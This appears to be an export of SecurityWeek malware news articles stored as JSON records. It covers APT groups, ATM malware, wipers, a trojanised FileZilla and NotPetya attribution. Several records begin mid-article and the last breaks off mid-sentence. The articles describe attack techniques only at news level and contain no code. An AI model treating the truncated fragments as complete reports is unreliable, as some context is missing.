Sofacy, which is believed to be behind attacks targeting the 2016 presidential election in the United States, has been known to target Ukraine and NATO countries. NATO was heavily targeted in early 2017, including with zero-day exploits, but Kaspersky said the group later started to shift its focus towards the Middle East and Central Asia, which had been less targeted in the first half of the year. According to the security firm, by mid-2017, detections of a Sofacy backdoor tracked as SPLM, CHOPSTICK and X-Agent showed that the hackers had been increasingly targeting former Soviet countries in Central Asia, including telecoms firms and defense-related organizations. The attacks were aimed at countries such as Turkey, Kazakhstan, Armenia, Kyrgyzstan, Jordan and Uzbekistan. Attacks involving SPLM and a tool tracked as Zebrocy were increasingly spotted between the second and fourth quarters of 2017 further east. The list of countries where these pieces of malware were detected by Kaspersky includes China, Mongolia, South Korea and Malaysia. Zebrocy, which allows attackers to collect data from victims, has been used to target various types of organizations, including accounting firms, science and engineering centers, industrial organizations, ministries, embassies and consulates, national security and intelligence agencies, press and translation services, and NGOs. As for the infrastructure used in these attacks, researchers pointed out that Sofacy has been fairly consistent throughout the years and many of its techniques and patterns have been publicly disclosed. As a result, Kaspersky expects to see some changes this year. “Sofacy is one of the most active threat actors we monitor, and it continues to spear-phish its way into targets, often on a remarkable global scale,” explained Kurt Baumgartner, principal security researcher at Kaspersky Lab. “Our data and detections show that in 2017, the threat actor further developed its toolset as it moved from high volume NATO spear-phish targeting towards the Middle East and Central Asia, before finally shifting its focus further East. Mass campaigns appear to have given way to subsets of activity and malware involving such tools as Zebrocy and SPLM.” " }
{ "_id" : { "$oid" : "5b27c4456cefc41c844ab2e6" }, "Category" : "Malware", "Title" : "ATM Malware Allows Attackers to Steal Millions", "Address" : "https://www.securityweek.com/atm-malware-allows-attackers-steal-millions", "Date" : "October 07, 2014", "Article" : "A forensic investigation into cyberattacks against ATM machines has led to the discovery of malware used to steal millions of dollars.   This new malware has been dubbed Backdoor.MSIL.Tyupkin by Kaspersky Lab and affects ATM machines from a major ATM manufacturer that run on Microsoft Windows 32-bit. It was found on more than 50 machines in Eastern Europe. Based on submissions to VirusTotal, it is believed the malware has spread to other regions as well, including India, China and the United States.   Most of the samples analyzed by Kaspersky Lab were compiled around March 2014, but the malware has evolved over time. The last variant (version .d) uses anti-debug and anti-emulation techniques and disables McAfee Solidcore from the infected system, according to the researchers.   \"The malware uses several sneaky techniques to avoid detection,\" according to Kaspersky Lab's Global Research & Analysis Team (GReAT), which was called in by a financial institution to investigate the situation. \"First of all, it is only active at a specific time at night. It also uses a key based on a random seed for every session. Without this key, nobody can interact with the infected ATM.\"   When the key is entered correctly however, the malware displays information on how much money is available in every cash cassette, and allows an attacker with physical access to the machine to withdraw 40 notes from the selected cassette.   The first step for the attackers is to gain access to the ATM. At that point, they insert a bootable CD to install the Tyupkin malware. After the system is rebooted, the infected ATM is under the control of the attacker, and the malware runs in an infinite loop waiting for a command. According to the researchers, the malware only accepts commands at specific times on Sunday and Monday nights   \"Over the last few years, we have observed a major upswing in ATM attacks using skimming devices and malicious software,\" said Vicente Diaz, principal security researcher at Kaspersky Lab, in a statement. \"Now we are seeing the natural evolution of this threat with cyber-criminals moving up the chain and targeting financial institutions directly.\"   The Tyupkin malware, he noted, is an example of the attackers taking advantage of weaknesses in the ATM infrastructure. Financial organizations are strongly advised to review the physical security of their machines as well as their network infrastructure, he added. In particular, Kaspersky Lab suggests organizations replace all locks and master keys on the upper hood of the ATM machines and get rid of the defaults provided by the manufacturer. In addition, banks should install an alarm and ensure it works, as the cybercriminals behind the attacks only infected ATMs without alarms installed.   \"Since criminals require physical access to the ATM, that severely limits what can be achieved,\" said Jean-Philippe Taggart, senior security researcher at Malwarebytes. \"Europe has many ATMs directly on the street, and that makes them somewhat more vulnerable to physical attack. The session key required in this attack prevents a rogue mule from taking over the scam. It attacks the bank infrastructure directly, so while customers’ accounts are not being drained, they will feel the pain when the banks transfer the costs of fraud over with higher fees. Banks will likely not tighten their ATM security stance until cost analysis shows that this type of attack is costing them enough to warrant it.\"   \"Tyupkin malware doesn’t seem like a big deal at this point,\" Taggart added. \"The larger issue is that the banks still do risk analysis and fraud budgets to evaluate if the problem needs immediate attention, rather than addressing the problem from the get go.\"   INTERPOL alerted the affected member countries and is assisting ongoing investigations.   \"Offenders are constantly identifying new ways to evolve their methodologies to commit crimes, and it is essential that we keep law enforcement in our member countries involved and informed about current trends and modus operandi,\" said Sanjay Virmani, director of the INTERPOL Digital Crime Centre, in a statement.

Shamoon 2, a more recent version of the threat, was recently used to target organizations in Saudi Arabia, including the country’s General Authority of Civil Aviation (GACA). The first wave of Shamoon 2 attacks was launched on November 17 and a second wave on November 29. The attacks, which some have attributed to Iran, relied on the Disttrack malware to automatically start wiping infected systems at a specified time. The malware was planted on targeted systems using stolen credentials, and security firm Symantec believes the information may have been obtained in a prior attack launched by a threat actor named Greenbug. This cyber espionage group has used a remote access Trojan (RAT) called Ismdoor and various other tools in attacks aimed at organizations in the Middle East. The attackers targeted aviation, investment, government and education organizations in several countries, including Saudi Arabia, Iran, Iraq, Bahrain, Qatar, Kuwait and Turkey, and a Saudi company in Australia. Greenbug has sent out fake business proposal emails to trick users into downloading malware onto their systems. The attackers delivered a RAR archive that stored a clean PDF and a compiled HTML help file (.chm) that contained the Ismdoor Trojan. In order to avoid detection, the malware has been hidden in alternate data streams (ADS). Once executed, Ismdoor opens a backdoor and uses PowerShell for command and control (C&C) purposes. The Trojan is designed to install other pieces of malware, including ones capable of logging keystrokes and collecting browser, email and other sensitive data. Symantec determined that Greenbug may have supplied credentials for the Shamoon attacks after detecting an Ismdoor infection on an administrator computer housed by one of the organizations targeted with Disttrack. Researchers have not found any solid evidence linking the threat actors, but they pointed out that Ismdoor and other Greenbug tools became inactive just one day before the November 17 attacks. Palo Alto Networks reported earlier this month that a variant of the Shamoon 2 malware is also designed to target virtualization products, likely in an effort to make recovery more difficult for attacked organizations. Saudi Arabia has warned organizations to be on alert following a series of new attacks, Reuters reported on Monday. The country’s labor ministry, a chemicals firm and other companies have been allegedly hit. " }

Trend Micro and ClearSky have published a report detailing the actor’s activities, including targets, tools and attack methods. The first report on CopyKittens was published in November 2015, but the group is believed to have been active since at least 2013. The hackers initially appeared to mainly target Israeli individuals, including diplomats and researchers, but further analysis showed that its operations have also covered entities in Saudi Arabia, Turkey, the United States, Jordan and Germany. The list of targets includes government organizations, academic institutions, IT firms, defense companies and contractors, municipal authorities, and employees of the United Nations. According to the latest report on CopyKittens activity, dubbed Operation Wilted Tulip, the hackers have used a wide range of tools and tactics. In some cases, they relied on watering hole attacks where news and other websites were compromised and set up to deliver exploits. The organizations whose websites were abused as watering holes includes The Jerusalem Post, for which even Germany’s Federal Office for Information Security (BSI) issued an alert. The hackers also delivered malware using malicious documents set up to exploit various vulnerabilities, including the recently discovered Office flaw tracked as CVE-2017-0199, which at one point was a zero-day. In one attack, the hackers breached the email account of an employee of the Ministry of Foreign Affairs in the Turkish Republic of Northern Cyprus. The compromised account was used to send out a weaponized document to foreign affairs ministries in various countries around the world. Some of the attacks targeting Israeli entities also leveraged fake social media profiles, often appearing to belong to attractive women. As for the tools and malware used by CopyKittens, they leveraged automated scanning and exploitation tools such as Havij, sqlmap and Acunetix to find vulnerabilities in the targeted websites. The threat actor has used both its own and widely available malware and tools, including the TDTESS backdoor, the Matryoshka RAT, the Vminst lateral movement tool, the Cobalt Strike threat emulation software, Mimikatz, Metasploit, the ZPP compression utility, and the Empire post-exploitation tool. Some of the tools and malware have allowed the group to use DNS for command and control (C&C) communications and data exfiltration. CopyKittens is not the only Iran-linked cyber espionage group. In the past years, security firms have also exposed the activities of actors known as Rocket Kitten, COBALT GYPSY, and Charming Kitten (Newscaster, NewsBeef). " }

According to Kaspersky Lab, the malware is written entirely in Java and does require that Java is installed on the host system in order to run. Once the malware successfully infects a system, however, it can launch DDoS attacks using both HTTP and UDP floods.  Identified by Kaspersky Lab as HEUR:Backdoor.Java.Agent.a, the malware exploits CVE-2013-2465, a critical Java vulnerability with a CVSS base score of 10.0 that was patched by Oracle in June. Interestingly, the bot is controlled using the Internet Relay Chat (IRC) protocol and uses the PircBot open framework to facilitate communication through IRC. Additionally, Kaspersky researchers found that the malware uses the “Zelix Klassmaster obfuscator” to prevent it from being reverse engineered by researchers and competing cybercrimnals.  “Zelix generates a different key for each class – which means that in order to decrypt all the strings in the application, you have to analyze all the classes in order to find the decryption keys,” Anton Ivanov, a Kaspersky Lab Expert, explained in a blog post.  The malware sample was provided to Kaspersky Lab by Zoltan Balazs, CTO at MRG Effitas, an independent IT security research organization. Additional details on the cross-platform malware are available on Kaspersky Lab’s Securelist.  " }

VENOM was publicly disclosed last week. Its name stands for Virtualized Environment Neglected Operations Manipulation (VENOM). The bug resides in QEMU's virtual Floppy Disk Controller, and is used in numerous virtualization platforms including Xen and the native QEMU client. The vulnerability was discovered by a researcher at CrowdStrike, and has existed since 2004. The bug is agnostic of both the host and guest operating system. In order to exploit it, an attacker - or their malware -would need administrative or root privileges in the guest operating system. While there has been some discussion about comparing its severity to the Heartbleed bug, experts agree the VENOM vulnerability should be patched as soon as possible.  \"Oracle has decided to issue this Security Alert based on a number of factors, including the potential impact of a successful exploitation of this vulnerability, the amount of detailed information publicly available about this flaw, and initial reports of exploit code already 'in the wild',\" blogged Eric Maurice, software security assurance director at Oracle. \"Oracle further recommends that customers apply the relevant fixes as soon as they become available.\" According to Oracle, Oracle Linux, Oracle Virtual Compute Appliance, Oracle VM and Oracle VM VirtualBox have updates to address the bug. However, the company also stated that the following products include QEMU but do not yet have updates available: Oracle Database Appliance, Oracle Exadata Database Machine, Oracle Exalogic Elastic Cloud and Oracle Exalytics In-Memory Machine. \"Oracle is investigating and will provide fixes for affected products as soon as they have been fully tested and determined to provide effective mitigation against this vulnerability,\" according to Oracle's advisory. \"The product lists will be updated without additional emails being sent to customers and OTN Security Alerts subscribers. Thus, customers will need to check back for updates.\" Given its potential impact, VENOM can be big if an organization moves too slowly to address the threat, said Kapil Raina, a member of the Cloud Security Alliance's Virtualization Working Group and head of product marketing at Elastica. \"The fact that it can be patched will limit the damage, but it will require an organization to schedule downtime and update their systems -- not always possible immediately in every environment,\" said Raina.

Outlier Security approaches endpoint threat detection by focusing on the forensic evidence already available on the machine itself. \"The endpoint is a treasure trove of forensic evidence…the endpoint has the forensic record of almost everything that happens,\" Hogland told SecurityWeek. Outlier Security's first product is a software-as-a-service (SaaS) based endpoint threat detection and incident response (ETDR) tool called Outlier, which collects the evidence directly from the evidence so that enterprises can proactively hunt for threats. Outlier takes the data from endpoints, applies cloud-based analytics, and lets incident responders identify the threats. Unlike other threat detection platforms on the market, Outlier is agentless; there is no software agent that needs to be installed on the endpoints being monitored. There are several endpoint visibility systems designed to monitor endpoints to uncover compromised endpoints, but they typically rely on data collection agents installed on the monitored endpoints. Many IT operations groups balk at deploying or managing agents. That may be because the agent may conflict with another agent or software on the machine. Or it may be because agents can be costly to manage and do not always scale well. The alternative, where security teams rely on manual processes to detect breaches on the endpoint, is time-consuming and costly. Things get missed and false positives are harder to filter out. \"Enterprises need a way to quickly close the loop between events happening on endpoints and incident response,\" Hogland said. If the endpoint already has the evidence of what's really going on, there is no need to query an installed agent to provide the same information, Hogland said. Agents were \"overengineered,\" and no longer necessary, he said. Outlier Security intends to automate data filtering and analysis to help enterprises identify high-risk alerts and false positives. The system detects known indicators of compromise, malicious actions, and unknown malware. Security teams would be able to look at underlying contextual evidence to verify threats and respond quickly. \"Advanced endpoint monitoring and security analytics don’t have to be hard or painful,” Hogland said.   " }

Zachary Shames, a student at James Madison University, has pleaded guilty to charges of aiding and abetting computer intrusions and faces up to 10 years in prison. Sentencing has been scheduled for June 16. According to authorities, Shames created a keylogger that he sold to more than 3,000 people, who used it to infect over 16,000 computers. Court documents obtained by The Register show that the keylogger developed by Shames, who had used the online moniker “Mephobia,” is Limitless. The malware, classified by some security firms as a remote access Trojan (RAT), has been sold on several hacking forums for $40 or less. Trend Micro reported in November 2014 that Limitless had been leveraged in business email compromise (BEC) schemes. Attackers had used the malware to steal credentials and other valuable information from the targets. Limitless was one of the several keyloggers used in NightHunter, a campaign in which attackers harvested login credentials from organizations across the world. The operation, detailed by Cyphort in 2014, had been active since at least 2009 and it targeted Google, Yahoo, Facebook, Skype, Dropbox, Amazon, Yahoo, Hotmail, LinkedIn, Rediff and banking credentials. Court documents from Shames’ case reference SecurityWeek’s 2014 article on NightHunter attacks. According to investigators, Shames was not very good at covering his tracks. For instance, the PayPal account he used to receive payments was registered with his real name, and a HostGator account hosting a Limitless domain was registered with his real home address. Furthermore, the main email account used by the keylogger’s author was accessed on several occasions from IP addresses registered to James Madison University. Authorities said Shames started developing the keylogger while in high school (between 2009 and 2013) and continued improving it from his college dorm room.

The threat actor is tracked by FireEye as APT37 and Reaper, and by other security firms as Group123 (Cisco) and ScarCruft (Kaspersky). APT37 has been active since at least 2012, but it has not been analyzed as much as the North Korea-linked Lazarus group, which is said to be responsible for high-profile attacks targeting Sony and financial organizations worldwide. Cisco published a report in January detailing some of the campaigns launched by the threat actor in 2017, but APT37 only started making headlines in early February when researchers revealed that it had been using a zero-day vulnerability in Adobe Flash Player to deliver malware to South Korean users. APT37, whose goals appear to align with North Korea’s military, political and economic interests, has mainly focused on targeting public and private entities in South Korea, including government, defense, military and media organizations. However, according to FireEye, the group expanded its attacks to Japan, Vietnam and even the Middle East last year. The list of targets includes organizations in the chemicals, manufacturing, electronics, aerospace, healthcare, and automotive sectors.  One of the targets in the Middle East was a telecommunications services provider that had entered an agreement with the North Korean government. The deal fell through, which is when APT37 started hacking the Middle Eastern company, likely in an effort to collect information, FireEye said. APT37 has exploited several Flash Player and Hangul Word Processor vulnerabilities to deliver various types of malware, including the RUHAPPY wiper, the CORALDECK exfiltration tool, the GELCAPSULE and HAPPYWORK downloaders, the MILKDROP and SLOWDRIFT launchers, the ZUMKONG infostealer, the audio-capturing tool SOUNDWAVE, and backdoors tracked by FireEye as DOGCALL, KARAE, POORAIM, WINERACK and SHUTTERSPEED. This malware has been delivered using social engineering tactics, watering holes, and even torrent sites for wide-scale distribution. FireEye is highly confident that APT37 is linked to the North Korean government based on several pieces of evidence, including the use of a North Korean IP, malware compilation timestamps consistent with a typical workday in North Korea, and objectives that align with Pyongyang’s interests. “North Korea has repeatedly demonstrated a willingness to leverage its cyber capabilities for a variety of purposes, undeterred by notional redlines and international norms,” FireEye said in its report. “Though they have primarily tapped other tracked suspected North Korean teams to carry out the most aggressive actions, APT37 is an additional tool available to the regime, perhaps even desirable for its relative obscurity. We anticipate APT37 will be leveraged more and more in previously unfamiliar roles and regions, especially as pressure mounts on their sponsor.” Neither Kaspersky nor Cisco have explicitly attributed the APT37 attacks to North Korea.

{ "_id" : { "$oid" : "5b27c44a6cefc41c844ab2ee" }, "Category" : "Malware", "Title" : "Rombertik Malware’s Destructive Payload Is an Anti-Piracy Feature: Symantec", "Address" : "https://www.securityweek.com/rombertik-malware%E2%80%99s-destructive-payload-anti-piracy-feature-symantec", "Date" : "May 18, 2015", "Article" : "Cisco reported earlier this month that the Rombertik malware attempts to destroy the master boot record (MBR) of infected devices to prevent researchers from analyzing the threat. However, Symantec says the feature is actually designed to prevent unauthorized use of the Trojan. According to Symantec, Rombertik is a new version of the Trojan known as Carbon Grabber (Infostealer.Retgate). The malware allows cybercriminals to steal information and gives them backdoor access to infected devices. The malware has several anti-analysis mechanisms designed to prevent researchers from running it in a sandbox. If someone tries to tamper with it, the malware attempts to overwrite the device’s MBR and encrypt files. However, Symantec believes this destructive payload is not actually aimed at security researchers. Researchers believe the feature is actually a trap for those who might try to use and modify the malware without authorization. When cybercriminals purchase Rombertik from its creator, they get a copy that communicates only with their command and control (C&C) server. The address of the C&C is embedded in the binary code. Some cybercrooks might try to hack the binary and change the address of the C&C server so that they can use the malware without having to pay for it. To prevent unauthorized use, the developers ensured that the destructive protection mechanism is triggered when such attempts are discovered. After the MBR is overwritten and the files on the infected device are encrypted, the following message is displayed: “Carbon crack attempt, failed.” This message makes sense if the destructive payload is intended as punishment for individuals trying to pirate the Trojan. However, Symantec has noted that this protection mechanism can be bypassed. The resource containing the URL of the C&C server is encrypted using an RSA key. A hash of this RSA key is stored in the “compiled time” field of the PE header. This hash is compared to the hash of the key that is used, and the malware runs normally if the hashes match. If modifications are made to the malware and the RSA key is replaced, the hashes will not match and the malware triggers the destructive payload. While this is a good way to test if the malware has been tampered with, the developers appear to have made a mistake. Symantec experts determined that the encryption keys are included in the malware binary. “We were able to encrypt a different C&C URL using the public key and decrypt it using the included private key. This means that if somebody wanted to repurpose a copy of the Trojan without paying for a new one, they could do so using this method without triggering the destructive payload,” Symantec wrote in a blog post. “Based on our analysis, we don’t believe that this functionality is designed as an anti-analysis feature to thwart the efforts of security researchers. Instead, this looks like it is the malware developer’s way of punishing the naive cheapskates who may be trying to use this software for free,” researchers noted. “There’s no denying the damage that this threat can cause, it really is very destructive, but this is no indiscriminate wiper Trojan.” " }

The malicious FTP program is fully functional and maintains the look of the official version, and has no evidence of suspicious behavior such as entries in the system registry, communication or changes in application look and feel, AVAST cautioned.  According to the security firm, the interface of the malicious installer is nearly identical to the official version, with just a slight difference in the version of NullSoft installer, which the malware uses 2.46.3-Unicode, while the official installer uses v2.45-Unicode.   “The whole operation is very quick and quiet,” AVAST noted in a blog post. “Log in details are sent to attackers from the ongoing FTP connection only once. Malware doesn’t search bookmarks or send any other files or saved connections.”  Stolen login credentials are encoded using a custom base64 algorithm and then sent to the IP 144.76.120.243, a server hosted at “Server Block” in Germany.  AVAST found 3 domains linked to the IP, all registered through Naunet.ru, a domain registrar associated with malicious activities and masks registrant contact information and ignores requests to suspend domains, acccording to AVAST.  One sign that users may be using the malicious version of FileZilla is if the software update feature is not functioning. “Any attempt to update the application fails, which is most likely a protection to prevent overwriting of malware binaries,” AVAST said.  One version of the malware (version 3.5.3) was compiled in September 2012, indicating that these attackers have been running this attack campaign for some time. The first suspicious signs are \"bogus download URLs\", AVAST said, noting that the malcious FileZilla installers are typically hosted on hacked websites with fake content.  “We assume that the stolen FTP accounts are further abused for upload and spread of malware. Attackers also can download whole webpage source code containing database log in, payment system, customer private information etc.,” AVAST said. As of publishing time, SecurityWeek found that detection rates for four separate malicious FileZilla installers was very low, with between 2 and 4 anti-virus vendors identifying the files as malicious, based on data provided by VirusTotal. [Update: Shortly after publishing time, the number of anti-virus vendors detecting the malware has increased for one sample to 9 of 50. Expect this to jump even further over the next few days.] More details on the malware are available on AVAST’s blog. " }

According to experts, the compromised news website has English, Russian and Georgian sections, but only the Georgian language pages appeared to deliver the malware. The threat is a new version of OSX/Leverage, a backdoor first spotted back in 2013. Interestingly, not all visitors were targeted. JavaScript code planted on the site profiled each user and only served the malware if certain conditions were met. The malware was pushed only to devices whose user agent showed that the victim accessed the site from a Mac and a web browser other than Chrome. The script also checked cookies to determine if the user had previously visited the website and analyzed the malicious JavaScript code. If a returning user is detected, the exploitation chain is terminated. If all the conditions are met and the potential victim is using the Safari browser from a Mac computer, an iframe is loaded and a fake Adobe website is displayed. The site is designed to trick users into downloading a fake Flash Player critical update. The malicious Flash Player update is delivered via a Metasploit module that abuses Safari functionality to force the download and execution of an OS X application. However, the victim still needs to allow the execution of the file when prompted or manually execute it from the Downloads folder. Once executed, the malware creates a Launch Agent for persistence and opens the genuine Adobe Flash Player website to avoid raising suspicion. The backdoor contacts its command and control (C&C) server and sends it information about the infected system. “Unlike the earlier version of the malware, this new version does not limit itself to a predefined set of commands and instead allows an unrestricted command shell capability back into an infected system,” Volexity researchers said in a blog post. The new version of the Leverage malware, which was also spotted by Sophos earlier this month, is signed with an Apple code signing certificate issued to a developer apparently named “Aleks Papandopulo.” The first version of Leverage had been disguised as an image file and in some cases it downloaded a logo of the Syrian Electronic Army hacker group onto compromised machines. Interestingly, Volexity has discovered a link between an IP address associated with one of the domains serving the new version of Leverage and Stantinko, a recently uncovered botnet that has powered a massive adware campaign since 2012. The Stantinko operation has mainly targeted Russia and Ukraine. Related Reading: Turla Cyberspies Developing Mac OS X Malware Related Reading: New \"Dok\" Mac OSX Malware Steals Sensitive Data " }

In addition, while accessing user accounts, the employee would have been able to view their Customer Proprietary Network Information (CPNI) without authorization. CPNI data is associated with services customers purchase from AT&T.   It is not clear how many customers were affected by the breach or if consumers in other states may have been involved.   \"AT&T's commitments to customer privacy and data security are top priorities, and we take those commitments seriously,\" according to the letter.   \"Simply stated, this is not the way we conduct business, and as a result, this individual no longer works here,\" the letter notes.

Italian siblings Giulio Occhionero, 45, and Francesca Maria Occhionero, 48, have been arrested for targeting many high-profile individuals and organizations in hacker attacks. Authorities said more than 18,000 email accounts had been compromised and 87 gigabytes worth of data had been stolen. The list of targets includes the president of the European Central Bank, a former prime minister, cardinals in the Vatican, political parties, ministries, technology and energy companies, and members of a Masonic lodge. The attacks had been carried out since at least 2010 and they relied on a piece of malware dubbed EyePyramid. Researchers from Kaspersky Lab have found some samples of the malware compiled in 2014 and 2015 and used them to obtain additional information on attack methods and targets. According to experts, the attackers used social engineering and spear-phishing emails to deliver the malware to victims. The malware was attached to the emails as ZIP or 7Zip archives. The EyePyramid executable file stored in these archives often had a name that included multiple spaces in order to hide its extension. The use of this simple technique points to the campaign’s low level of sophistication, Kaspersky researchers said. Trend Micro has also analyzed the attacks and determined that the threat actor sent out the spear-phishing emails from compromised accounts, particularly ones belonging to attorneys and associates at various law firms. According to the security firm, EyePyramid was written in .NET and it uses multiple layers of obfuscation to hide sensitive parts of the code, which made detection and analysis more difficult. Information about command and control (C&C) servers has also been “heavily obfuscated.” “Based on our analysis, we can conclude that the de-obfuscation routine includes a decryption step, based on the 3DES cipher, along with MD5 followed by SHA256 of the input data,” said Federico Maggi, senior threat researcher at Trend Micro. Trend Micro said the malware collects credentials, keystrokes and files. The data is then encrypted and exfiltrated to an email address controlled by the attacker using the MailBee.NET.dll APIs. Kaspersky reported that its products had blocked more than 90 EyePyramid infection attempts. While 80 percent of these attempts were spotted in Italy, the malware was also detected in France, Indonesia, Monaco, Mexico, China, Taiwan, Germany and Poland. Kaspersky says the malware is not sophisticated and not difficult to detect. The company also pointed out that the attackers had poor operational security (OPSEC) as they failed to hide their real IP addresses when launching attacks, and they used regular phone calls and WhatsApp to discuss their activities. On the other hand, experts pointed out that despite the lack of sophistication, the attackers still managed to steal large amounts of data from victims without being identified for several years. “As seen from other known cyberespionage operations, it’s not necessary for the attackers to use high profile malware, rootkits, or zero-days to run long-standing cyberespionage operations,” Kaspersky researchers said.

Moscow has denied the accusations. In a statement released on Thursday, the White House attributed the June 2017 attack to the Russian military and described it as “the most destructive and costly cyber-attack in history.” “The attack, dubbed ‘NotPetya,’ quickly spread worldwide, causing billions of dollars in damage across Europe, Asia, and the Americas,” the White House Press Secretary stated. “It was part of the Kremlin’s ongoing effort to destabilize Ukraine and demonstrates ever more clearly Russia’s involvement in the ongoing conflict. This was also a reckless and indiscriminate cyber-attack that will be met with international consequences.” According to the Australian government, the conclusion that threat actors sponsored by Russia are responsible for the cyberattack was reached based on information from its domestic intelligence agencies and consultation with the U.S. and U.K. “The Australian Government condemns Russia’s behaviour, which posed grave risks to the global economy, to government operations and services, to business activity and the safety and welfare of individuals,” stated Angus Taylor, Australia’s Minister for Law Enforcement and Cybersecurity. “The Australian Government is further strengthening its international partnerships through an International Cyber Engagement Strategy to deter and respond to the malevolent use of cyberspace.” Canada’s Communications Security Establishment (CSE) also accused Russia of launching the NotPetya attack based on its own assessment. “Canada condemns the use of the NotPetya malware to indiscriminately attack critical financial, energy, government, and infrastructure sectors around the world in June 2017,” said CSE Chief Greta Bossenmaier. “As previously stated, the Government of Canada continues to strongly oppose the use of cyberspace for reckless and destructive criminal activities. We remain committed to working with our allies and partners to maintain the open, reliable and secure use of cyber space.” New Zealand’s Government Communications Security Bureau (GCSB) said that while the country was not directly targeted by NotPetya, the incident did cause disruption to some organizations that had rushed to update their systems after news of the attack broke. New Zealand has joined the other Five Eyes countries in condemning the attack, but its statement suggests that its attribution of the incident to Russia is based solely on information provided by GCSB’s international partners. British Foreign Office Minister for Cyber Security Lord Tariq Ahmad said Russia “showed a continued disregard for Ukrainian sovereignty” by launching the NotPetya attack. Moscow has denied the accusations, describing them as unsubstantiated and groundless. “This is nothing more than the continuation of the Russophobic campaign lacking any evidence,” said Kremlin spokesman Dmitry Peskov. The NotPetya malware (also known as PetrWrap, exPetr, GoldenEye and Diskcoder.C) affected tens of thousands of systems around the world. Researchers initially believed NotPetya was a piece of ransomware, but a closer analysis revealed that it was actually a destructive wiper. Rosneft, AP Moller-Maersk, Merck, FedEx, Mondelez International, Nuance Communications, Reckitt Benckiser, and Saint-Gobain reported losing hundreds of millions of dollars due to the attack. Last year, Five Eyes countries and Japan officially accused North Korea of launching the WannaCry attack. " }

In a new report, the security firm revealed the ongoing attacks - which it dubbed 'Operation Tropic Trooper' - go back to 2012, but the malware the attackers are using shares traits with samples Trend Micro first examined in 2011. Between March and May of this year, 62 percent of the malware infections have targeted Taiwanese organizations, while the remaining 38 percent have hit entities in the Philippines. In Taiwan, the targets have included government ministries and heavy industries, while the targets in the Philippines have been in the military.  While Trend Micro did not identify the actors behind the attacks, researchers were able to pinpoint command and control servers in four countries: Taiwan (home to 43 percent of the servers), Hong Kong (14 percent), U.S. (36 percent) and the United Arab Emirates (seven percent). \"This latest attack relied on two of the most-exploited Windows vulnerabilities to date—CVE-2010-3333 and CVE-2012-0158—to infiltrate the target networks,\" blogged Kervin Alintanahin, threats analyst at Trend Micro. \"This suggests that the organizations were running on unpatched, vulnerable systems that made them more susceptible to threats.\" \"Aside from exploiting those vulnerabilities, the threat actors used basic steganography,\" the researcher continued. \"This means they were able to conceal malicious code in JPEG files popularly used as Windows XP wallpapers. Steganography, although not a new cybercriminal tactic, is not commonly used in targeted attacks.\" The attackers may have chosen this approach because of the continued use of XP systems in Taiwan and the Philippines despite the operating system having reached its end-of-life, Alintanahin noted. There is also a chance the threat actors have used steganography because they either still use Windows XP themselves or have in-depth knowledge of it, the researchers added. The attack starts with emails laced with a malicious attachment. Opening the documents leads to the execution of malware that downloads an image file to the system, according to Trend Micro. \"Closer inspection of the downloaded image file reveals that it uses steganography to hide the malicious content,\" the researcher explained. \"It will decrypt executable files in memory and will not save it to the disks. These files are installers and will drop the backdoor BKDR_YAHAMAM. With the backdoor’s capabilities of downloading, uploading, and creating a remote shell, it can easily conduct the next phase of its attack which is to find other targets within its reach.\" \"Operation Tropic Trooper is not highly sophisticated,\" Alintanahin noted. \"But the fact that it has attained some degree of success and has managed to infiltrate crucial organizations in both Taiwan and the Philippines shows the urgent need for targeted entities to rectify their shortcomings in terms of security. Knowing that attackers are still using old techniques and exploiting known vulnerabilities will make it easier for the targeted organizations to pinpoint and fix security gaps in their networks.\" The Trend Micro report can be read here.  " }

Spring Dragon has been around since at least 2012, but there is some evidence suggesting that it may have been active since 2007. The state-sponsored threat group has mainly targeted military and government organizations in Southeast Asia. Kaspersky Lab learned recently from a research partner in Taiwan of new attacks launched by the group. Data collected by the security firm indicates that the APT actor has also targeted political parties, universities and other educational institutions, and companies in the telecommunications sector. The cyberspies appear to focus on countries around the South China Sea, including Taiwan, Indonesia, Vietnam, the Philippines, Hong Kong, Malaysia and Thailand. The threat actor has been using a wide range of tools, including backdoors that can download other files to the compromised machine, upload files to a remote server, and execute files and commands. Kaspersky Lab has identified a total of more than 600 malware samples used over the past years. According to the security firm, the malware leverages a command and control (C&C) infrastructure of more than 200 unique IP addresses and domains, with each sample using hardcoded campaign codes and custom C&C addresses. The C&C servers used by Spring Dragon are located in several countries, but roughly two-thirds are located in Hong Kong and the United States. Some servers have also been spotted in Germany, China and Japan. Based on malware compilation timestamps, which Kaspersky believes have not been altered, the attackers appear to be located in the GMT+8 timezone, which corresponds to China, Indonesia, Malaysia, Mongolia, Singapore, Taiwan, the Philippines and Western Australia. The malware compilation timestamps also suggest that the members of the group either work in two shifts, or Spring Dragon malware has been compiled by two different groups, one of which may be located in Europe. “The number of malware samples which we managed to collect (over 600) for the group surpassed many others, and suggests an operation on a massive scale. It’s possible that this malware toolkit is offered in specialist public or private forums to any buyers, although, to date, we haven’t seen this,” explained Kaspersky’s Noushin Shabab. " }

Researchers at Intego reported that a new variant of a rootkit detected as OSX/Crisis had reached their malware labs. Like previous variants, OSX/Crisis.C is delivered via a dropper that installs silently, without requiring a password, and works on Mac OS X 10.5, 10.6, and 10.7. However, the authors of the malware – known as the Hacking Team – have introduced some new twists in the form of changes to the dropper code and the backdoor configuration file format.   \"The dropper executes an unusual segment: __INITSTUB. The original entry point EIP points to this code segment before reaching the almost empty _main function of the program,\" blogged researcher Arnaud Abbati. \"For this reason, an incautious researcher using a debugger could get infected without even noticing it. While it uses a different way to resolve system symbols, it crashes on OS X Mountain Lion or OS X Mavericks (segmentation fault). This might be a 64-bit bug in the malware.\"   When the dropper runs successfully, it hides several files in the user's Library/Preferences folder in the home directory inside a fake application bundle named OvzD7xFr.app. Once that is done, it executes a backdoor and creates a LaunchAgent file called com.apple.mdworker.plist, Intego reported.   \"Similar to OSX/Crisis.B, this binary is obfuscated using MPress packer,\" Abbati explained. \"It doesn’t run on OS X 10.9 as it is linked against the Apple System Profiler private framework, SPSupport, which is now 64-bit only; an “Image not found” exception is raised, and then it crashes. Furthermore, on a supported target, the backdoor simply uninstalls its files and quits. This could be related to a corrupted configuration file (the sample one starts with NULL bytes).\"   \"Other than a few new tricks, features implemented by the backdoor component are similar to previous variants: it patches the Activity Monitor application to hide itself, takes screenshots, captures audio and video, gathers user locations, connects to WiFi hotspots, syncs collected data with a Command and Control (C&C) server, and tricks the user using social engineering to gain System Administrator privileges and drop its rootkit,\" the researcher added.   Meanwhile, researchers at Sophos spotted Mac malware targeting users through courier scam emails. If a recipient clicks on the link in the email, they are taken to a malicious domain, where users of 